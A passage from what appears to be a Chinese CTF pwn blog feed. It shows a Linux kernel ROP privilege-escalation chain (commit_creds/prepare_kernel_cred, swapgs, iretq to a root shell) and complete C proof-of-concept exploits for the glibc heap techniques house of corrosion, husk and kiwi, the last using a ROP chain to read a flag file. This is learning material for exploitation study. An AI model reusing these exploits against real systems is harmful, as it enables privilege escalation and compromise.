i++)</span><br><span class="line">    &#123;</span><br><span class="line">        payload[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = prepare_kernel_cred;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret;</span></span><br><span class="line">    payload[i++] = commit_creds;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff8106a6d2</span> + offset; <span class="comment">// mov rdi, rax; jmp rdx;</span></span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    payload[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    payload[i++] = user_cs;</span><br><span class="line">    payload[i++] = user_rflags;</span><br><span class="line">    payload[i++] = user_sp;</span><br><span class="line">    payload[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, payload, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure><p>这里是wiki上的payload片段，但是我有点不明白的是这里为什么要把mov rdi, rax; call rdx;的地址放到rcx里，并且这里不应该使用call rdx，如果是使用了call的话就会导致在结束是ret回来的地址就是gadget后面紧随的地址了，这也就导致swapgs以及后续rop chain无法执行，所以这里应该用jmp来代替(我也是在动态调试中发现的)。</p><p>其次</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80/image-20220321220914739.png" alt="image-20220321220914739"></p><p>这里可以看到是可以泄漏出core_ioctl的地址的，所以我们可以不是用/tmp/kallsyms来获取地址。</p><p>raw_vmlinux_base的由来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ~/Downloads/study_kernel % objdump -h <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  0 .text         00c0325d  ffffffff81000000  0000000001000000  00200000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br></pre></td></tr></table></figure><p>commit_creds偏移的由来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(ELF(<span class="string">&quot;./core/vmlinux&quot;</span>).symbols[<span class="string">&#x27;commit_creds&#x27;</span>]-<span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0x9c8e0&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#get-root-shell" >https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#get-root-shell<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在学习kernel pwn我就是完全跟着wiki走的&lt;/p&gt;
&lt;h2 id=&quot;CISCN2017-babydriver&quot;&gt;&lt;a href=&quot;#CISCN2017-babydriver&quot; class=&quot;headerlink&quot; title=&quot;CISCN2017 - babydr</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="kernel UAF" scheme="https://cv196082.gitee.io/tags/kernel-UAF/"/>
    
    <category term="kernel ROP" scheme="https://cv196082.gitee.io/tags/kernel-ROP/"/>
    
  </entry>
  
  <entry>
    <title>house of corrosion/husk/kiwi</title>
    <link href="https://cv196082.gitee.io/2022/03/11/house-of-corrosion-husk-kiwi/"/>
    <id>https://cv196082.gitee.io/2022/03/11/house-of-corrosion-husk-kiwi/</id>
    <published>2022-03-11T03:42:43.000Z</published>
    <updated>2022-03-11T03:43:36.698Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。</p><h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><p>在large bin attack和tcache stashing unlink当中我们可以实现任意地址写入很大的数，那么我们写入这个数的作用是什么呢？</p><p>这一利用方式就是通过其他攻击方式修改global_max_fast的值为一个很大的值，这就导致我们生成的chunk为一个fast bin chunk，然而chunk在进入fast bin时是遵循一定规律的，free时会根据size进入到相应的地址，这也就促使我们可以进一步利用了。</p><p>首先这里的计算公式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = ((target - main_arena) * <span class="number">2</span>) - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>第一种方式也就是在fastbinY后的任意地址写入堆地址</p><p><img src="/images/image-20220308171542436.png" alt="image-20220308171542436"></p><p>当我们取出这个chunk时，会将fd指针留在相应的位置，所以如果存在UAF就可以更进一步的实现任意地址写任意值</p><p><img src="/images/image-20220308171727077.png" alt="image-20220308171727077"></p><p>下面是以上两个方法的poc可以直接在glibc2.31下使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offset2size(ofs) ((ofs)*2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA 0x1ebb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBAL_MAX_FAST 0x1eeb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_FUNCTABLE 0x1f0ff8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_ARGINFO 0x1f1350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_GADGET 0xe6c81</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">char</span> *ptr0;</span><br><span class="line">    <span class="keyword">char</span> *ptr1;</span><br><span class="line">    <span class="keyword">char</span> *ptr2;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    <span class="built_in">free</span>(ptr0);</span><br><span class="line">    libc_base = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)ptr0 - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *aaa = libc_base + GLOBAL_MAX_FAST;</span><br><span class="line">    *aaa = ptr0;</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr1, <span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><p>这一堆利用主要针对的是printf的利用链，具体链子不再关心，我们的最终效果是劫持<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>到我们堆地址，然后伪造格式化字符串对应的地址的值one_gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA       0x1ebb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBAL_MAX_FAST  0x1eeb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_FUNCTABLE 0x1f0ff8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_ARGINFO   0x1f1350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_GADGET       0xe6c81</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">  <span class="keyword">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lxn&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *aaa=libc_base+GLOBAL_MAX_FAST;</span><br><span class="line">  *aaa=a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终实现的就是污染掉__printf_arginfo_table但是另一个table也不能为null所以也伪造上，不过不需要弄什么数据。</p><p>具体过程大家可以去调试，这里用到了house of corrosion</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>这一调用链通过触发__malloc_assert，调用fflush进而调用stderr中的_IO_file_jumps中的sync指针</p><p>触发的方式也会有很多种，这里常用的就是在验证top chunk中的一种，<a href="https://cv196082.gitee.io/2022/03/03/house-of/">house of force</a>这篇文章中利用这是需要绕过这一assert，可以去看一下是什么assert</p><p>gdb调试assert时发现fflush调用的是位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针,多次调试发现RDX始终是一个固定的地址</p><p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<a href="https://cv196082.gitee.io/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/">setcontext+61</a><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p><p><img src="/images/image-20220311103015542.png" alt="image-20220311103015542"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="keyword">size_t</span> libc_base;</span><br><span class="line"><span class="keyword">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setROP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="keyword">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="keyword">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_hel</span></span><br><span class="line">    per_jumps;</span><br><span class="line">    <span class="keyword">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="keyword">size_t</span> *top_size = (<span class="keyword">size_t</span>*)((<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到就只是劫持了sync为setcontext+61然后就是通过IO_helper控制rdx进而控制其他所有寄存器，实现ROP</p><p>例题的话，后续会更一篇NULL_FxCK，因为用的Glibc为2.32所以会出现一系列问题，所以不增加这篇文章篇幅了</p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/235598" >https://www.anquanke.com/post/id/235598<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。&lt;/p&gt;
&lt;h2 id=&quot;house-of-corrosion&quot;&gt;&lt;a href=&quot;#house-of-corrosion&quot; clas</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>从两道题目看setcontext</title>
    <link href="https://cv196082.gitee.io/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/"/>
    <id>https://cv196082.gitee.io/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/</id>
    <published>2022-03-10T06:44:50.000Z</published>
    <updated>2022-03-10T06:44:49.221Z</updated>
    
